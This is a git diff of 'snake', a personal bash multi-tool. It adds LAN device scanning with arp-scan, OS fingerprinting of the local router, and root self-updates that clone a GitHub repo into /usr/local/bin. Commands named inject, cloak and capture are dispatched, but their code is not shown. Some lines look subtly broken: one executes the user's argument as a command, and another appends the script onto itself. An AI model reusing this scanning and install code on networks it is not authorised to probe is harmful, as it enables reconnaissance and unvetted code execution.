- elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+ elif [[ $_system == "$(uname -n)" ]]; then #nn
    reboot
- elif [[ $_system == "OS/390" ]]; then
+ elif [[ $_system == "OS/390" ]]; then #nn
    reboot
- elif [[ $_system == "INTEGRITY" ]]; then
+ elif [[ $_system == "INTEGRITY" ]]; then #nn
    reboot ; reboot now ; reboot -s ; reboot -n
- elif [[ $_system == "Integrity" ]]; then
+ elif [[ $_system == "Integrity" ]]; then #nn
    reboot ; reboot now ; reboot -s ; reboot -n
- elif [[ $_system == "$(uname -n)" ]]; then # UNIX
+ elif [[ $_system == "$(uname -n)" ]]; then #nn
    reboot
  else
    printf "$RED Not supported sys$NC\n"
@@ -7672,9 +9606,19 @@ _record_a(){ #selft
       printf "$RED Not supported yet$NC\n"
     elif [[ $_system == "OpenBSD" ]]; then
       printf "$RED Not supported yet$NC\n"
-    elif [[ $_system == "$(uname -n)" ]]; then # UNIX
-      printf "$RED Not supported yet$NC\n"
     elif [[ $_system == "SunOS" ]]; then
+      printf "$RED Not supported yet$NC\n"
+    elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+      printf "$RED Not supported yet$NC\n"
+    elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+      printf "$RED Not supported yet$NC\n"
+    elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+      printf "$RED Not supported yet$NC\n"
+    elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+      printf "$RED Not supported yet$NC\n"
+    elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+      printf "$RED Not supported yet$NC\n"
+    elif [[ $_system == "$(uname -n)" ]]; then
       printf "$RED Not supported yet$NC\n"
     elif [[ $_system == "OS/390" ]]; then
       printf "$RED Not supported yet$NC\n"
@@ -7829,6 +9773,132 @@ _scanHouse(){ #selft
 
       fi
 
+
+    elif [[ "$1" == "-c" ]]; then
+
+      if [ $_system == "Darwin" ]; then
+
+         printf "\n"
+         printf "$WHITE$(airport -I | awk '/ SSID/ {print substr($0, index($0, $1))}' | awk '{print $2,$3,$4,$5,$6}')$NC\n"
+         printf "\n"
+
+         FIRST=$(sudo arp-scan -l | sed '1d' | sed '1d' | sed '$d' | sed '$d' | sed '$d' | awk '{print $1}')
+         SECOND=$(sudo arp-scan -l | sed '1d' | sed '1d' | sed '$d' | sed '$d' | sed '$d' | awk '{print $2}')
+         THIRD=$(sudo arp-scan -l | sed '1d' | sed '1d' | sed '$d' | sed '$d' | sed '$d' | awk '{print $1}' |  xargs -L1 snake -os)
+         FOURTH=$(sudo arp-scan -l | sed '1d' | sed '1d' | sed '$d' | sed '$d' | sed '$d' | awk '{print $2}' |  xargs -L1 snake -soui)
+
+         : '
+         printf " %-20s | %-20s | %-20s\n " IP\ ADDRESS\ MAC ADDRESS\ WHATEVER\ HEAD
+         printf "%-20s | %-20s | %-20s\n" "$FIRST\n" "$SECOND\n" "$THIRD\n" "$FOURTH\n"
+         '
+
+
+         printf "$RED\n"
+         #sudo arp-scan -l | sed '1d' | sed '1d' | sed '$d' | sed '$d' | sed '$d' | awk '{print $1}'
+         printf "$FIRST\n"
+         printf "$YELLOW\n"
+         #sudo arp-scan -l | sed '1d' | sed '1d' | sed '$d' | sed '$d' | sed '$d' | awk '{print $1}' |  xargs -L1 snake -os
+         printf "$SECOND\n"
+         printf "$GREEN\n"
+         #sudo arp-scan -l | sed '1d' | sed '1d' | sed '$d' | sed '$d' | sed '$d' | awk '{print $2}'
+         printf "$THIRD\n"
+         printf "$RED\n"
+         #sudo arp-scan -l | sed '1d' | sed '1d' | sed '$d' | sed '$d' | sed '$d' | awk '{print $2}' |  xargs -L1 snake -soui
+         printf "$FOURTH\n"
+
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+       elif [[ $_system == "Linux" ]]; then
+
+         printf "\n"
+         printf "$WHITE$(nmcli -t -f active,ssid |grep enp0s3 | sed '$d' | awk '{print $4,$5,$6}')$NC\n"
+         printf "\n"
+
+         sudo arp-scan -l | sed -n '2!p'
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+       elif [[ $_system == "GNU" ]]; then
+
+         printf "\n"
+         printf "Router NAME\n"
+         printf "\n"
+         arp-scan -l | sed -n '2!p'
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+       elif [[ $_system == "Haiku" ]]; then
+
+         printf "\n"
+         printf "Router NAME\n"
+         printf "\n"
+         arp -a | awk '{print $1,$3,$2}'
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+       elif [[ $_system == "HP-UX" ]]; then
+
+         printf "\n"
+         printf "Router NAME\n"
+         printf "\n"
+         arp -a | awk '{print $1,$3,$2}'
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+
+       elif [[ $_system == "Minix" ]]; then
+
+         printf "\n"
+         printf "Router NAME\n"
+         printf "\n"
+         arp-scan -l | sed -n '2!p'
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+       elif [[ $_system == "OpenBSD" ]]; then
+
+         printf "\n"
+         printf "Router NAME\n"
+         printf "\n"
+         sudo arp-scan -l | sed -n '2!p'
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+       elif [[ $_system == "SunOS" ]]; then
+
+         printf "\n"
+         printf "Router NAME\n"
+         printf "\n"
+         arp -a | awk '{print $1,$3,$2}'
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+       elif [[ $_system == "OS/390" ]]; then
+
+         printf "\n"
+         printf "Router NAME\n"
+         printf "\n"
+         arp -a | awk '{print $1,$3,$2}'
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+
+       else
+
+         printf "$RED Not supported sys$NC\n"
+
+      fi
+
     else
 
       if [ $_system == "Darwin" ]; then
@@ -7873,6 +9943,16 @@ _scanHouse(){ #selft
          date
          printf "$NC\n"
 
+       elif [[ $_system == "HP-UX" ]]; then
+
+         printf "\n"
+         printf "Router NAME\n"
+         printf "\n"
+         arp -a
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
 
 
        elif [[ $_system == "Minix" ]]; then
@@ -7896,6 +9976,76 @@ _scanHouse(){ #selft
          date
          printf "$NC\n"
 
+       elif [[ $_system == "SunOS" ]]; then
+
+         printf "\n"
+         printf "Router NAME\n"
+         printf "\n"
+         arp -a
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+       elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+         printf "\n"
+         printf "Router NAME\n"
+         printf "\n"
+         arp -a
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+       elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+         printf "\n"
+         printf "Router NAME\n"
+         printf "\n"
+         arp -a
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+       elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+         printf "\n"
+         printf "Router NAME\n"
+         printf "\n"
+         arp -a
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+       elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+         printf "\n"
+         printf "Router NAME\n"
+         printf "\n"
+         arp -a
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+       elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+         printf "\n"
+         printf "Router NAME\n"
+         printf "\n"
+         arp -a
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+       elif [[ $_system == "OS/390" ]]; then
+
+         printf "\n"
+         printf "Router NAME\n"
+         printf "\n"
+         arp -a
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
        else
 
          printf "$RED Not supported sys$NC\n"
@@ -7903,6 +10053,13 @@ _scanHouse(){ #selft
       fi
 
     fi
+
+}
+
+
+_space(){ #selfc
+
+   du -hs "$@" | sort -nr 2>/dev/null
 
 }
 
@@ -8030,6 +10187,25 @@ _morph(){ #selfx
 
 }
 
+_openWith(){ #selft
+   open -a $1 $2
+}
+
+thermic(){ #selfc
+
+while true
+   do
+    clear
+    istats | sed '$d'
+    printf "$WHITE\n"
+    date
+    printf "$NC\n"
+    sleep 1
+   done
+
+
+
+}
 
 
 _update(){ #selfi
@@ -8157,6 +10333,71 @@ if [ $_system == "Darwin" ]; then
    rm -rf foornal
    printf "$RED _updated$NC\n"
 
+ elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+   su
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   chmod +x snake
+   cp snake /usr/local/bin
+   cd .. ; cd ..
+   rm -rf foornal
+   printf "$RED _updated$NC\n"
+
+ elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+   su
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   chmod +x snake
+   cp snake /usr/local/bin
+   cd .. ; cd ..
+   rm -rf foornal
+   printf "$RED _updated$NC\n"
+
+ elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+   su
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   chmod +x snake
+   cp snake /usr/local/bin
+   cd .. ; cd ..
+   rm -rf foornal
+   printf "$RED _updated$NC\n"
+
+ elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+   su
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   chmod +x snake
+   cp snake /usr/local/bin
+   cd .. ; cd ..
+   rm -rf foornal
+   printf "$RED _updated$NC\n"
+
+ elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+   su
+   mkdir foornal
+   cd foornal
+   git clone https://github.com/mldMoldovan/snake.git -q >/dev/null
+   cd snake
+   chmod +x snake
+   cp snake /usr/local/bin
+   cd .. ; cd ..
+   rm -rf foornal
+   printf "$RED _updated$NC\n"
+
  elif [[ $_system == "OS/390" ]]; then
 
    su
@@ -8193,57 +10434,135 @@ _brew(){ #selfx
 
    elif [[ $1 == "css" ]]; then
      if [ $2 == "?" ]; then
-     nano .brew.css
+        nano .brew.css
      else
-     nano brew.css
+        nano brew.css
      fi
    elif [[ $1 == "c++" ]]; then
      if [ $2 == "?" ]; then
-     nano .brew.cpp
+        nano .brew.cpp
      else
-     nano brew.cpp
+        nano brew.cpp
+     fi
+   elif [[ $1 == "java" ]]; then
+     if [ $2 == "?" ]; then
+        nano .brew.java
+     else
+        nano brew.java
+     fi
+   elif [[ $1 == "xml" ]]; then
+     if [ $2 == "?" ]; then
+        nano .brew.xml
+     else
+        nano brew.xml
+     fi
+   elif [[ $1 == "ts" ]]; then
+     if [ $2 == "?" ]; then
+        nano .brew.ts
+     else
+        nano brew.ts
      fi
    elif [[ $1 == "c" ]]; then
      if [ $2 == "?" ]; then
-     nano .brew.c
+        nano .brew.c
      else
-     nano brew.c
+        nano brew.c
      fi
    elif [[ $1 == "sh" ]]; then
      if [ $2 == "?" ]; then
-     nano .brew.sh
+        nano .brew.sh
      else
-     nano brew.sh
+        nano brew.sh
      fi
    elif [[ $1 == "_h" ]]; then
      if [ $2 == "?" ]; then
-     nano .brew.h
+        nano .brew.h
      else
-     nano brew.h
+        nano brew.h
      fi
    elif [[ $1 == "js" ]]; then
      if [ $2 == "?" ]; then
-     nano .brew.js
+        nano .brew.js
      else
-     nano brew.js
+        nano brew.js
      fi
    elif [[ $1 == "json" ]]; then
      if [ $2 == "?" ]; then
-     nano .brew.json
+        nano .brew.json
      else
-     nano brew.json
+        nano brew.json
      fi
    elif [[ $1 == "rb" ]]; then
      if [ $2 == "?" ]; then
-     nano .brew.rb
+        nano .brew.rb
      else
-     nano brew.rb
+        nano brew.rb
+     fi
+   elif [[ $1 == "go" ]]; then
+     if [ $2 == "?" ]; then
+        nano .brew.go
+     else
+        nano brew.go
      fi
    elif [[ $1 == "swift" ]]; then
      if [ $2 == "?" ]; then
-     nano .brew.swift
+        nano .brew.swift
      else
-     nano brew.swift
+        nano brew.swift
+     fi
+   elif [[ $1 == "objc" ]]; then
+     if [ $2 == "?" ]; then
+        nano .brew.objc
+     else
+        nano brew.objc
+     fi
+   elif [[ $1 == "c#" ]]; then
+     if [ $2 == "?" ]; then
+        nano .brew.cs
+     else
+        nano brew.cs
+     fi
+   elif [[ $1 == "bat" ]]; then
+     if [ $2 == "?" ]; then
+        nano .brew.bat
+     else
+        nano brew.bat
+     fi
+   elif [[ $1 == "cmd" ]]; then
+     if [ $2 == "?" ]; then
+        nano .brew.cmd
+     else
+        nano brew.cmd
+     fi
+   elif [[ $1 == "rex" ]]; then
+     if [ $2 == "?" ]; then
+        nano .brew.rexx
+     else
+        nano brew.rexx
+     fi
+   elif [[ $1 == "perl" ]]; then
+     if [ $2 == "?" ]; then
+        nano .brew.perl
+     else
+        nano brew.perl
+     fi
+   elif [[ $1 == "php" ]]; then
+     if [ $2 == "?" ]; then
+        nano .brew.php
+     else
+        nano brew.php
+     fi
+   elif [[ $1 == "py" ]]; then
+     if [ $2 == "?" ]; then
+        nano .brew.python
+     else
+        nano brew.python
+     fi
+   elif [[ $1 == "sql" ]]; then
+     if [ $2 == "?" ]; then
+        nano .brew.sql
+     else
+        nano brew.sql
      fi
    elif [[ $1 == "magic" ]]; then
      printf "\n"
@@ -8254,6 +10573,20 @@ _brew(){ #selfx
        printf "$NEW_BLUE Brew$YELLOW Error$NC\n"
    fi
 
+
+}
+
+
+
+_ros(){ #selfe
+
+
+
+   if [ "$2" == "i" ]; then
+      snake _wit? $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-11)$1 | sed 's/Aggressive OS guesses/Running/g' | grep 'Running:' | sed -n '1p' | grep -v 'WARNING' | awk '{print $2,$3,$4}'
+   else
+      snake _wit? $1 | sed 's/Aggressive OS guesses/Running/g' | grep 'Running:' | sed -n '1p' | awk '{print $2,$3}'
+   fi
 
 }
 
@@ -8315,7 +10648,11 @@ _s_n_(){
       printf "$RED $1 is here $NC\n"
     elif [[ $_system == "OpenBSD" ]]; then
       printf "$RED Not supported yet$NC\n"
+    elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+      printf "$RED Not supported yet$NC\n"
     elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+      printf "$RED Not supported yet$NC\n"
+    elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
       printf "$RED Not supported yet$NC\n"
     elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
       printf "$RED Not supported yet$NC\n"
@@ -8379,36 +10716,12 @@ done
 if [ "$1" == "-v" ]; then
 
 
-printf "\n"
-printf "        $_name    \n"
-printf "          $_version                 \n"
-printf "\n"
-
-
-elif [[ "$1" == "-vh" ]]; then
-
   printf "\n"
-  printf "$_name\n"
-  printf "\n"
-  printf "Usage:  snake [-vhrage] [--summon <daemon> ]\n"
-  printf "\n"
-  printf "Options: -v - Show version info\n"
-  printf "         -h - Show help menu\n"
-  printf "         -r - research\n"
-  printf "         -a - affichage\n"
-  printf "         -g - generalize\n"
-  printf "         -e - engage\n"
-  printf "         --summon - Daemons!\n"
-  printf "         --morph - MAC-only\n"
-  printf "         --brew - Just magic\n"
-  printf "         --meta - Whatever \n"
-  printf "\n"
-  printf "Examples: snake -p\n"
-  printf "          snake --summon Artyom\n"
-  printf "          snake --opaa\n"
+  printf "        $_name    \n"
+  printf "          $_version                 \n"
   printf "\n"
 
-elif [[ "$1" == "-hv" ]]; then
+elif [[ "$1" == "-vh" || "$1" == "-hv" ]]; then
 
   printf "\n"
   printf "$_name\n"
@@ -8433,8 +10746,22 @@ elif [[ "$1" == "-hv" ]]; then
 
 elif [[ "$1" == "-h" ]]; then
 
-
-
+  printf "\n"
+  printf "$_name\n"
+  printf "\n"
+  printf "Usage:  snake [-vhrage] [--summon <daemon> ]\n"
+  printf "\n"
+  printf "Options: -v - Show version info\n"
+  printf "         -h - Show help menu\n"
+  printf "         -r - research\n"
+  printf "         -a - affichage\n"
+  printf "         -g - generalize\n"
+  printf "         -e - engage\n"
+  printf "\n"
+  printf "Examples: snake -p\n"
+  printf "          snake --summon Artyom\n"
+  printf "          snake --opaa\n"
+  printf "\n"
 
 if [ "$2" == "-v" ]; then
   printf "\n"
@@ -8512,364 +10839,277 @@ elif [[ "$1" == "--nest" ]]; then
 
      _exec
 
-elif [[ "$1" == "-look" ]]; then
+elif [[ "$(echo $1 | grep -c 'look')" == "1" ]]; then
 
      _look
 
-elif [[ "$1" == "--look" ]]; then
-
-    _look
-
-elif [[ "$1" == "--qinstall" ]]; then
+elif [[ "$(echo $1 | grep -c 'qinstall')" == "1" ]]; then
 
     _exec_q
 
-elif [[ "$1" == "-qinstall" ]]; then
-
-      _exec_q
-
-elif [[ "$1" == "-uninstall" ]]; then
+elif [[ "$(echo $1 | grep -c 'uninstall')" == "1" || "$(echo $1 | grep -c 'dsp')" == "1" ]]; then
 
      _exec_u
 
-elif [[ "$1" == "--uninstall" ]]; then
-
-     _exec_u
-
-elif [[ "$1" == "--install" ]]; then
+elif [[ "$(echo $1 | grep -c 'install')" == "1" ]]; then
 
      _exec_i $2
 
-elif [[ "$1" == "-install" ]]; then
-
-     _exec_i $2
-
-elif [[ "$1" == "-backup" ]]; then
+elif [[ "$(echo $1 | grep -c 'backup')" == "1" || "$(echo $1 | grep -c 'bkp')" == "1" ]]; then
 
      _exec_b $2
-
-elif [[ "$1" == "-bkp" ]]; then
-
-     _exec_b $2
-
-elif [[ "$1" == "-dsp" ]]; then
-
-    _exec_u
 
 elif [[ "$1" == "-alive" ]]; then
 
     _self alive
 
-elif [[ "$1" == "-db" ]]; then
+elif [[ "$(echo $1 | grep -c 'ther')" == "1" ]]; then
+
+    _thermic
+
+elif [[ "$(echo $1 | grep -c 'space')" == "1" ]]; then
+
+    _space
+
+elif [[ "$(echo $1 | grep -c 'db')" == "1" ]]; then
 
       _self $2 $3 $4
 
-elif [[ "$1" == "-oui" ]]; then
+elif [[ "$(echo $1 | grep -c 'oui')" == "1" ]]; then
 
      _vndr $2
 
-elif [[ "$1" == "--morph" ]]; then
+elif [[ "$(echo $1 | grep -c 'morph')" == "1" ]]; then
 
      _morph $2 $3
 
-elif [[ "$1" == "-morph" ]]; then
-
-     _morph $2 $3
-
-elif [[ "$1" == "-meta" ]]; then
+elif [[ "$(echo $1 | grep -c 'meta')" == "1" ]]; then
 
      _metamorph $2 $3 $4 $5
 
-elif [[ "$1" == "--meta" ]]; then
-
-     _metamorph $2 $3 $4 $5
-
-elif [[ "$1" == "--opaa" ]]; then
+elif [[ "$(echo $1 | grep -c 'opaa')" == "1" ]]; then
 
      _opaa
 
-elif [[ "$1" == "-opaa" ]]; then
-
-     _opaa
-
-elif [[ "$1" == "-snap" ]]; then
+elif [[ "$(echo $1 | grep -c 'snap')" == "1" ]]; then
 
      _snap
 
 
-elif [[ "$1" == "-decompose" ]]; then
+elif [[ "$(echo $1 | grep -c 'decompose')" == "1" ]]; then
 
      _decompose
 
-elif [[ "$1" == "-ports" ]]; then
+elif [[ "$(echo $1 | grep -c 'ports')" == "1" ]]; then
 
      _ports $2 $3
 
-elif [[ "$1" == "-docked" ]]; then
+elif [[ "$(echo $1 | grep -c 'docked')" == "1" ]]; then
 
      _docked $2
 
-elif [[ "$1" == "-radar" ]]; then
+elif [[ "$(echo $1 | grep -c 'radar')" == "1" ]]; then
 
      _radar
 
-elif [[ "$1" == "-suicide" ]]; then
+elif [[ "$(echo $1 | grep -c 'suicide')" == "1" ]]; then
 
     _suicide
 
-elif [[ "$1" == "-reboot" ]]; then
+elif [[ "$(echo $1 | grep -c 'reboot')" == "1" ]]; then
 
     _reboot
 
-elif [[ "$1" == "-purge" ]]; then
+elif [[ "$(echo $1 | grep -c 'purge')" == "1" ]]; then
 
      _purge
 
-elif [[ "$1" == "-maid" ]]; then
+elif [[ "$(echo $1 | grep -c 'maid')" == "1" ]]; then
 
      _maid $2
 
-elif [[ "$1" == "-cheese" ]]; then
+elif [[ "$(echo $1 | grep -c 'cheese')" == "1" ]]; then
 
      _cheese
 
-elif [[ "$1" == "-piece" ]]; then
+elif [[ "$(echo $1 | grep -c 'piece')" == "1" ]]; then
 
      _piece $2
 
-elif [[ "$1" == "-mb" ]]; then
+elif [[ "$(echo $1 | grep -c 'mb')" == "1" ]]; then
 
      _mb $2
 
-elif [[ "$1" == "-poof" ]]; then
+elif [[ "$(echo $1 | grep -c 'poof')" == "1" ]]; then
 
      _poof
 
-elif [[ "$1" == "-clear" ]]; then
+elif [[ "$(echo $1 | grep -c 'clear')" == "1" ]]; then
 
      _clear
 
-elif [[ "$1" == "-lock" ]]; then
+elif [[ "$(echo $1 | grep -c 'lock')" == "1" ]]; then
 
      _lock
 
-elif [[ "$1" == "-inject" ]]; then
+elif [[ "$(echo $1 | grep -c 'inject')" == "1" ]]; then
 
      _inject $2 $3
 
 elif [[ "$1" == "_wit?" ]]; then
 
-     _wit $2
+     _wit $2 $3
 
 elif [[ "$1" == "_wit??" ]]; then
 
-        _wit6 $2
+        _wit6 $2 $3
 
 elif [[ "$1" == "_wth?" ]]; then
 
-     _wth $2
+     _wth $2 $3
 
 elif [[ "$1" == "_wth??" ]]; then
 
-     _wth6 $2
+     _wth6 $2 $3
 
 elif [[ "$1" == "_col!" ]]; then
 
-     _col $2
+     _col $2 $3
 
 elif [[ "$1" == "_col!?" ]]; then
 
-     _col6 $2
+     _col6 $2 $3
 
 elif [[ "$1" == "_wtf?" ]]; then
 
-    _wtf $2
+    _wtf $2 $3
 
 elif [[ "$1" == "_wtf??" ]]; then
 
-    _wtf6 $2
+    _wtf6 $2 $3
 
 elif [[ "$1" == "_blyat!" ]]; then
 
-    _blyat $2
+    _blyat $2 $3
 
 elif [[ "$1" == "_blyat!?" ]]; then
 
-    _blyat6 $2
+    _blyat6 $2 $3
 
 elif [[ "$1" == "_pizdec!" ]]; then
 
-   _pizdec $2
+   _pizdec $2 $3
 
 elif [[ "$1" == "_pizdec!?" ]]; then
 
-   _pizdec6 $2
+   _pizdec6 $2 $3
 
 elif [[ "$1" == "_IP!" ]]; then
 
    _IP $2
 
-elif [[ "$1" == "-off" ]]; then
-
-  _off
-
-elif [[ "$1" == "-update" ]]; then
+elif [[ "$(echo $1 | grep -c 'update')" == "1" ]]; then
 
   _update $2
 
-elif [[ "$1" == "-brew" ]]; then
+elif [[ "$(echo $1 | grep -c 'brew')" == "1" ]]; then
 
   _brew $2 $3
 
-elif [[ "$1" == "off" ]]; then
+elif [[ "$(echo $1 | grep -c 'off')" == "1" ]]; then
 
   _off
 
-elif [[ "$1" == "--summon" ]]; then
-
-  _summon $2
-
-elif [[ "$1" == "-design" ]]; then
+elif [[ "$(echo $1 | grep -c 'dsn')" == "1" || "$(echo $1 | grep -c 'design')" == "1" ]]; then
 
   _design $2 $3 $4 $5
 
-elif [[ "$1" == "-dsn" ]]; then
-
-  _design $2 $3 $4 $5
-
-elif [[ "$1" == "-summon" ]]; then
+elif [[ "$(echo $1 | grep -c 'summon')" == "1" ]]; then
 
   _summon $2
 
-elif [[ "$1" == "-origin" ]]; then
+elif [[ "$(echo $1 | grep -c 'origin')" == "1" ]]; then
 
   _origin $2
 
-elif [[ "$1" == "-radar" ]]; then
 
-  _radar
-
-elif [[ "$1" == "-self" ]]; then
+elif [[ "$(echo $1 | grep -c 'self')" == "1" ]]; then
 
   _self $2 $3 $4
 
-elif [[ "$1" == "-relist" ]]; then
+elif [[ "$(echo $1 | grep -c 'relist')" == "1" ]]; then
 
   _relist
 
-elif [[ "$1" == "-highlight" ]]; then
+elif [[ "$(echo $1 | grep -c 'highlight')" == "1" ]]; then
 
   _highlight
 
-elif [[ "$1" == "-reveal" ]]; then
+elif [[ "$(echo $1 | grep -c 'reveal')" == "1" ]]; then
 
   _reveal
 
-elif [[ "$1" == "++" ]]; then
+elif [[ "$(echo $1 | grep -c '++')" == "1" ]]; then
 
   _incr
 
-elif [[ "$1" == "-appID" ]]; then
+elif [[ "$(echo $1 | grep -c 'appID')" == "1" ]]; then
 
   _appID
 
-elif [[ "$1" == "-melt" ]]; then
+elif [[ "$($1 | grep -c 'melt')" == "1" ]]; then
 
   _melt
 
-elif [[ "$1" == "--melt" ]]; then
-
-  _melt
-
-elif [[ "$1" == "to" ]]; then
+elif [[ "$1" == "to" || "$1" == "or" || "$1" == "must" || "$1" == "dead" ]]; then
 
   _c_melt $2
 
-elif [[ "$1" == "or" ]]; then
-
-  _c_melt $2
-
-elif [[ "$1" == "is" ]]; then
+elif [[ "$1" == "is" || "$1" == "should" ]]; then
 
   _r_w $2
 
-elif [[ "$1" == "-shed" ]]; then
+elif [[ "$(echo $1 | grep -c 'shed')" == "1" ]]; then
 
   _melt
 
-elif [[ "$1" == "--shed" ]]; then
-
-  _melt
-
-elif [[ "$1" == "-rep" ]]; then
+elif [[ "$(echo $1 | grep -c 'rep')" == "1" ]]; then
 
   _replicate
 
-elif [[ "$1" == "--rep" ]]; then
-
-  _replicate
-
-elif [[ "$1" == "-salt" ]]; then
+elif [[ "$(echo $1 | grep -c 'salt')" == "1" ]]; then
 
   _salt $2 $3
 
-elif [[ "$1" == "--salt" ]]; then
-
-  _salt $2 $3
-
-elif [[ "$1" == "-net" ]]; then
+elif [[ "$(echo $1 | grep -c 'net')" == "1" ]]; then
 
   _network $2
 
-elif [[ "$1" == "--net" ]]; then
-
-  _network $2
-
-elif [[ "$1" == "iseewifi" ]]; then
+elif [[ "$(echo $1 | grep -c 'seewifi')" == "1" ]]; then
 
   airport -s | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'
 
-elif [[ "$1" == "iseeallwifi" ]]; then
+elif [[ "$(echo $1 | grep -c 'allwifi')" == "1" ]]; then
 
   airport -s
 
-elif [[ "$1" == "iseerouter" ]]; then
+elif [[ "$(echo $1 | grep -c 'router')" == "1" ]]; then
 
   _router_info
 
-elif [[ "$1" == "router" ]]; then
-
-  _router_info
-
-elif [[ "$1" == "iseepeople" ]]; then
+elif [[ "$(echo $1 | grep -c 'people')" == "1" ]]; then
 
   _people
 
-elif [[ "$1" == "people" ]]; then
+elif [[ "$(echo $1 | grep -c 'devices')" == "1" ]]; then
 
   _people
 
-elif [[ "$1" == "iseedevices" ]]; then
-
-  _people
-
-elif [[ "$1" == "devices" ]]; then
-
-  _people
-
-elif [[ "$1" == "iseeeverything" ]]; then
+elif [[ "$(echo $1 | grep -c 'everything')" == "1" ]]; then
 
   _everything
 
-elif [[ "$1" == "everything" ]]; then
-
-  _everything
-
-elif [[ "$1" == "iseemyself" ]]; then
-
-  _myself
-
-elif [[ "$1" == "myself" ]]; then
+elif [[ "$(echo $1 | grep -c 'myself')" == "1" ]]; then
 
   _myself
 
@@ -8885,6 +11125,10 @@ elif [[ "$1" == "-mac" ]]; then
 
   _macA
 
+elif [[ "$1" == "-soui" ]]; then
+
+  _jvdr $2
+
 elif [[ "$1" == "-cloak" ]]; then
 
   _cloak $2 $3 $4
@@ -8897,11 +11141,7 @@ elif [[ "$1" == "-ghost" ]]; then
 
   _ghost
 
-elif [[ "$1" == "-revive" ]]; then
-
-  _revive
-
-elif [[ "$1" == "-unghost" ]]; then
+elif [[ "$(echo $1 | grep -c 'unghost')" == "1" || "$(echo $1 | grep -c 'revive')" == "1" ]]; then
 
   _revive
 
@@ -8915,13 +11155,20 @@ elif [[ "$1" == "-blink" ]]; then
   printf "$_blinking\n"
 
 elif [[ "$1" == "-unblink" ]]; then
-  cat /usr/local/bin/snake | sed 's/_blinking=true/_blinking=false/g' > /usr/local/bin/_snake ; snake -uninstall ; sudo mv /usr/local/bin/_snake /usr/local/bin/snake ; sh snake -qinstall
+  #cat /usr/local/bin/snake | sed 's/_blinking=true/_blinking=false/g' > /.thesnake ; snake -uninstall ; sudo mv .thesnake /usr/local/bin/snake ; cd /usr/local/bin/ ; sh snake -qinstall ; cd ~
   printf "$_blinking\n"
+
+  _converted=$( echo snake | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+
+      cd ~ ; mkdir .blanao ; cd .blanao
+      sudo cp /usr/local/bin/snake ./snake
+      cat snake | sed "s/_blinking=true/_blinking=false/g" >> snake
+      sudo chmod +x snake ; sudo cp snake /usr/local/bin/ ; cd .. ; sudo rm -rf .blanao
 
 elif  [[ "$1" == "-check" ]]; then
   printf "$_blinking\n"
 
-elif [[ "$1" == "-blood" ]]; then
+elif [[ "$(echo $1 | grep -c 'blood')" == "1" ]]; then
 
   _blood
 
@@ -8929,20 +11176,18 @@ elif [[ "$1" == "-uname" ]]; then
 
   _uname
 
-elif [[ "$1" == "--blood" ]]; then
+elif [[ "$1" == "os" || "$1" == "-os" || "$1" == "--os" ]]; then
 
-  _blood
+  _ros $2 $3
 
-elif [[ "$1" == "-light" ]]; then
+elif [[ "$1" == "_+" ]]; then
+
+  _openWith $2 $3
+
+elif [[ "$(echo $1 | grep -c 'light')" == "1" ]]; then
   _light
-elif [[ "$1" == "--light" ]]; then
-  _light
 
-elif [[ "$1" == "-capture" ]]; then
-
-  _capture $2 $3
-
-elif [[ "$1" == "--capture" ]]; then
+elif [[ "$(echo $1 | grep -c 'capture')" == "1" ]]; then
 
   _capture $2 $3
 
